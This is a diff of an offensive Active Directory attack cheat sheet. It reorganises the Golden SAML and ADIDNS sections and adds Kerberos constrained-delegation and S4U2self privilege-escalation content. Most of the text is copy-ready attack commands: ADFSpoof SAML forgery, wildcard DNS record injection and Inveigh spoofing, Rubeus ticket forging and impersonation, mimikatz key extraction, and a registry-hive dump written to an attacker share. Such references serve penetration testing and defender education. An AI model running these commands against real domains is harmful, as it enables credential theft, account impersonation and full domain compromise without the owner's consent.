@@ -93,9 +93,6 @@
     - [ESC11 - Relaying NTLM to ICPR](#esc11---relaying-ntlm-to-icpr)
     - [Certifried CVE-2022-26923](#certifried-cve-2022-26923)
     - [Pass-The-Certificate](#pass-the-certificate)
-  - [Active Directory Federation Services](#active-directory-federation-services)
-    - [ADFS - Golden SAML](#adfs---golden-saml)
-  - [Active Directory Integrated DNS](#active-directory-integrated-dns)
   - [UnPAC The Hash](#unpac-the-hash)
   - [Shadow Credentials](#shadow-credentials)
   - [Active Directory Groups](#active-directory-groups)
@@ -103,6 +100,9 @@
     - [Abusing DNS Admins Group](#abusing-dns-admins-group)
     - [Abusing Schema Admins Group](#abusing-schema-admins-group)
     - [Abusing Backup Operators Group](#abusing-backup-operators-group)
+  - [Active Directory Federation Services](#active-directory-federation-services)
+    - [ADFS - Golden SAML](#adfs---golden-saml)
+  - [Active Directory Integrated DNS](#active-directory-integrated-dns)
   - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
     - [GenericAll](#genericall)
     - [GenericWrite](#genericwrite)
@@ -125,6 +125,8 @@
     - [MS-EFSRPC Abuse with Unconstrained Delegation](#ms---efsrpc-abuse-with-unconstrained-delegation)
   - [Kerberos Constrained Delegation](#kerberos-constrained-delegation)
   - [Kerberos Resource Based Constrained Delegation](#kerberos-resource-based-constrained-delegation)
+  - [Kerberos Service for User Extension](#kerberos-service-for-user-extension)
+    - [S4U2self - Privilege Escalation](#s4u2self---privilege-escalation)
   - [Kerberos Bronze Bit Attack - CVE-2020-17049](#kerberos-bronze-bit-attack---cve-2020-17049)
   - [PrivExchange attack](#privexchange-attack)
   - [SCCM Deployment](#sccm-deployment)
@@ -2814,69 +2816,6 @@ Exploitation:
   certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"
   ```
 
-## Active Directory Federation Services
-
-### ADFS - Golden SAML
-
-**Requirements**:
-* ADFS service account
-* The private key (PFX with the decryption password)
-
-**Exploitation**:
-* Run [mandiant/ADFSDump](https://github.com/mandiant/ADFSDump) on AD FS server as the AD FS service account. It will query the Windows Internal Database (WID): `\\.\pipe\MICROSOFT##WID\tsql\query`
-* Convert PFX and Private Key to binary format
-    ```ps1
-    # For the pfx
-    echo AAAAAQAAAAAEE[...]Qla6 | base64 -d > EncryptedPfx.bin
-    # For the private key
-    echo f7404c7f[...]aabd8b | xxd -r -p > dkmKey.bin 
-    ```
-* Create the Golden SAML using [mandiant/ADFSpoof](https://github.com/mandiant/ADFSpoof), you might need to update the [dependencies](https://github.com/szymex73/ADFSpoof).
-    ```ps1
-    mkdir ADFSpoofTools
-    cd $_
-    git clone https://github.com/dmb2168/cryptography.git
-    git clone https://github.com/mandiant/ADFSpoof.git 
-    virtualenv3 venvADFSSpoof
-    source venvADFSSpoof/bin/activate
-    pip install lxml
-    pip install signxml
-    pip uninstall -y cryptography
-    cd cryptography
-    pip install -e .
-    cd ../ADFSpoof
-    pip install -r requirements.txt
-    python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.pentest.lab saml2 --endpoint https://www.contoso.com/adfs/ls
-    /SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\administrator' --rpidentifier Supervision --assertions '<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\administrator</AttributeValue></Attribute>'
-    ```
-
-Other interesting tools to exploit AD FS: 
-* [WhiskeySAML](https://github.com/secureworks/whiskeysamlandfriends/tree/main/whiskeysaml)
-
-
-## Active Directory Integrated DNS
-
-ADIDNS zone DACL (Discretionary Access Control List) enables regular users to create child objects by default, attackers can leverage that and hijack traffic. Active Directory will need some time (~180 seconds) to sync LDAP changes via its DNS dynamic updates protocol.
-
-* Enumerate all records using [dirkjanm/adidnsdump](https://github.com/dirkjanm/adidnsdump)
-    ```ps1
-    adidnsdump -u DOMAIN\\user --print-zones dc.domain.corp (--dns-tcp)
-    ```
-* Query a node using [dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)
-    ```ps1
-    dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query $DomainController (--legacy)
-    ```
-* Add a node and attach a record
-    ```ps1
-    dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController
-    ```
-
-The common way to abuse ADIDNS is to set a wildcard record and then passively listen to the network.
-
-```ps1
-Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
-```
-
 
 ## UnPAC The Hash
 
@@ -2963,7 +2902,7 @@ Using the **UnPAC The Hash** method, you can retrieve the NT Hash for an User vi
 
 ## Active Directory Groups 
 
-## Dangerous Built-in Groups Usage
+### Dangerous Built-in Groups Usage
 
 If you do not want modified ACLs to be overwritten every hour, you should change ACL template on the object `CN=AdminSDHolder,CN=System` or set `"dminCount` attribute to `0` for the required object.
 
@@ -3003,7 +2942,7 @@ Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccount
 ```
 
 
-## Abusing DNS Admins Group
+### Abusing DNS Admins Group
 
 > It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).
 
@@ -3035,12 +2974,12 @@ Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccount
     sc \\dc01 start dns
     ```
 
-## Abusing Schema Admins Group
+### Abusing Schema Admins Group
 
 > The Schema Admins group is a security group in Microsoft Active Directory that provides its members with the ability to make changes to the schema of an Active Directory forest. The schema defines the structure of the Active Directory database, including the attributes and object classes that are used to store information about users, groups, computers, and other objects in the directory.
 
 
-## Abusing Backup Operators Group
+### Abusing Backup Operators Group
 
 > Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to and shut down the computer. This group cannot be renamed, deleted, or moved. By default, this built-in group has no members, and it can perform backup and restore operations on domain controllers.
 
@@ -3073,6 +3012,70 @@ This groups grants the following privileges :
 * Retrieve SAM,SECURITY and SYSTEM hives
   * [mpgn/BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA): `.\BackupOperatorToDA.exe -t \\dc1.lab.local -u user -p pass -d domain -o \\10.10.10.10\SHARE\`
   * [improsec/BackupOperatorToolkit](https://github.com/improsec/BackupOperatorToolkit): `.\BackupOperatorToolkit.exe DUMP \\PATH\To\Dump \\TARGET.DOMAIN.DK`
+
+
+## Active Directory Federation Services
+
+### ADFS - Golden SAML
+
+**Requirements**:
+* ADFS service account
+* The private key (PFX with the decryption password)
+
+**Exploitation**:
+* Run [mandiant/ADFSDump](https://github.com/mandiant/ADFSDump) on AD FS server as the AD FS service account. It will query the Windows Internal Database (WID): `\\.\pipe\MICROSOFT##WID\tsql\query`
+* Convert PFX and Private Key to binary format
+    ```ps1
+    # For the pfx
+    echo AAAAAQAAAAAEE[...]Qla6 | base64 -d > EncryptedPfx.bin
+    # For the private key
+    echo f7404c7f[...]aabd8b | xxd -r -p > dkmKey.bin 
+    ```
+* Create the Golden SAML using [mandiant/ADFSpoof](https://github.com/mandiant/ADFSpoof), you might need to update the [dependencies](https://github.com/szymex73/ADFSpoof).
+    ```ps1
+    mkdir ADFSpoofTools
+    cd $_
+    git clone https://github.com/dmb2168/cryptography.git
+    git clone https://github.com/mandiant/ADFSpoof.git 
+    virtualenv3 venvADFSSpoof
+    source venvADFSSpoof/bin/activate
+    pip install lxml
+    pip install signxml
+    pip uninstall -y cryptography
+    cd cryptography
+    pip install -e .
+    cd ../ADFSpoof
+    pip install -r requirements.txt
+    python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.pentest.lab saml2 --endpoint https://www.contoso.com/adfs/ls
+    /SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\administrator' --rpidentifier Supervision --assertions '<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\administrator</AttributeValue></Attribute>'
+    ```
+
+Other interesting tools to exploit AD FS: 
+* [WhiskeySAML](https://github.com/secureworks/whiskeysamlandfriends/tree/main/whiskeysaml)
+
+
+## Active Directory Integrated DNS
+
+ADIDNS zone DACL (Discretionary Access Control List) enables regular users to create child objects by default, attackers can leverage that and hijack traffic. Active Directory will need some time (~180 seconds) to sync LDAP changes via its DNS dynamic updates protocol.
+
+* Enumerate all records using [dirkjanm/adidnsdump](https://github.com/dirkjanm/adidnsdump)
+    ```ps1
+    adidnsdump -u DOMAIN\\user --print-zones dc.domain.corp (--dns-tcp)
+    ```
+* Query a node using [dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)
+    ```ps1
+    dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query $DomainController (--legacy)
+    ```
+* Add a node and attach a record
+    ```ps1
+    dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController
+    ```
+
+The common way to abuse ADIDNS is to set a wildcard record and then passively listen to the network.
+
+```ps1
+Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
+```
 
 
 ## Abusing Active Directory ACLs/ACEs
@@ -3658,31 +3661,59 @@ python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
 
 ## Kerberos Constrained Delegation
 
-> Request a Kerberos ticket which allows us to exploit delegation configurations, we can once again use Impackets getST.py script, however,
+> Kerberos Constrained Delegation (KCD) is a security feature in Microsoft's Active Directory (AD) that allows a service to impersonate a user or another service in order to access resources on behalf of that user or service.
 
-Passing the -impersonate flag and specifying the user we wish to impersonate (any valid username).
 
-```powershell
-# Discover
-$ Get-DomainComputer -TrustedToAuth | select -exp dnshostname
+### Identify a Constrained Delegation
 
-# Find the service 
-$ Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo
-```
+* BloodHound: `MATCH p = (a)-[:AllowedToDelegate]->(c:Computer) RETURN p`
+* PowerView: `Get-NetComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto | ft`
+* Native
+  ```powershell
+  Get-DomainComputer -TrustedToAuth | select -exp dnshostname
+  Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo
+  ```
 
 ### Exploit the Constrained Delegation
 
 * Impacket
-  ```bash
-  $ getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
+  ```ps1
+  getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
   ```
-* Rubeus
-  ```bash
-  $ ./Rubeus.exe tgtdeleg /nowrap # this ticket can be used with /ticket:...
-  $ ./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt
-  $ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
-  $ dir \\dc.domain.com\c$
+
+* Rubeus: S4U2 attack (S4U2self + S4U2proxy)
+  ```ps1
+  # with a password
+  Rubeus.exe s4u /nowrap /msdsspn:"time/target.local" /altservice:cifs /impersonateuser:"administrator" /domain:"domain" /user:"user" /password:"password"
+
+  # with a NT hash
+  Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:time/srv01.domain.com /altservice:cifs /ptt
+  Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
+  dir \\dc.domain.com\c$
   ```
+
+* Rubeus: use an existing ticket to perform a S4U2 attack to impersonate the "Administrator"
+  ```ps1
+  # Dump ticket
+  Rubeus.exe tgtdeleg /nowrap
+  Rubeus.exe triage
+  Rubeus.exe dump /luid:0x12d1f7
+
+  # Create a ticket
+  Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /ticket:doIFRjCCBUKgAwIBB...BTA== /ptt
+  ```
+
+* Rubeus : using aes256 keys
+  ```ps1
+  # Get aes256 keys of the machine account
+  privilege::debug
+  token::elevate
+  sekurlsa::ekeys
+
+  # Create a ticket
+  Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /user:win10x64$ /aes256:4b55f...fd82 /ptt
+  ```
+
 
 ### Impersonate a domain user on a resource
 
@@ -3696,6 +3727,7 @@ PS> $idToImpersonate.Impersonate()
 PS> [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
 PS> ls \\dc01.offense.local\c$
 ```
+
 
 ## Kerberos Resource Based Constrained Delegation
 
@@ -3782,6 +3814,34 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
     [*] Action: Import Ticket
     [+] Ticket successfully imported!
     ```
+
+## Kerberos Service for User Extension
+
+* Service For User To Self which allows a service to obtain a TGS on behalf of another user
+* Service For User To Proxy which allows a service to obtain a TGS on behalf of another user on another service
+
+### S4U2self - Privilege Escalation
+
+1. Get a TGT 
+    * Using Unconstrained Delegation
+    * Using the current machine account: `Rubeus.exe tgtdeleg /nowrap`
+2. Use that TGT to make a S4U2self request in order to obtain a Service Ticket as domain admin for the machine.
+    ```ps1
+    Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001.domain.local" /ticket:"base64ticket"
+    Rubeus.exe ptt /ticket:"base64ticket"
+
+    Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001" /ticket:"base64ticket" /ptt
+    ```
+
+The "Network Service" account and the AppPool identities can act as the computer account in terms of Active Directory, they are only restrained locally. Therefore it is possible to invoke S4U2self if you run as one of these and request a service ticket for any user (e.g. someone with local admin rights, like DA) to yourself.
+
+```ps1
+# The Rubeus execution will fail when trying the S4UProxy step, but the ticket generated by S4USelf will be printed.
+Rubeus.exe s4u /user:${computerAccount} /msdsspn:cifs/${computerDNS} /impersonateuser:${localAdmin} /ticket:${TGT} /nowrap
+# The service name is not included in the TGS ciphered data and can be modified at will.
+Rubeus.exe tgssub /ticket:${ticket} /altservice:cifs/${ServerDNSName} /ptt
+```
+
 
 ## Kerberos Bronze Bit Attack - CVE-2020-17049
 
@@ -4285,6 +4345,7 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [WONKACHALL AKERVA NDH2018 – WRITE UP PART 4](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/)
 * [WONKACHALL AKERVA NDH2018 – WRITE UP PART 5](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/)
 * [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad Shami](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
+* [A Case Study in Wagging the Dog: Computer Takeover - Will Schroeder - Feb 28, 2019](https://posts.specterops.io/a-case-study-in-wagging-the-dog-computer-takeover-2bcb7f94c783)
 * [[PrivExchange] From user to domain admin in less than 60sec ! - davy](http://blog.randorisec.fr/privexchange-from-user-to-domain-admin-in-less-than-60sec/)
 * [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy - March 16, 2017 - harmj0y](http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)
 * [Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY PÉREZ](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
@@ -4368,3 +4429,5 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [Beyond LLMNR/NBNS Spoofing – Exploiting Active Directory-Integrated DNS - July 10, 2018 | Kevin Robertson](https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/)
 * [ADIDNS Revisited – WPAD, GQBL, and More - December 5, 2018 | Kevin Robertson](https://www.netspi.com/blog/technical/network-penetration-testing/adidns-revisited/)
 * [Getting in the Zone: dumping Active Directory DNS using adidnsdump - Dirk-jan Mollema](https://blog.fox-it.com/2019/04/25/getting-in-the-zone-dumping-active-directory-dns-using-adidnsdump/)
+* [S4U2self abuse - TheHackerRecipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse)
+* [Abusing Kerberos S4U2self for local privilege escalation - cfalta](https://cyberstoph.org/posts/2021/06/abusing-kerberos-s4u2self-for-local-privilege-escalation/)
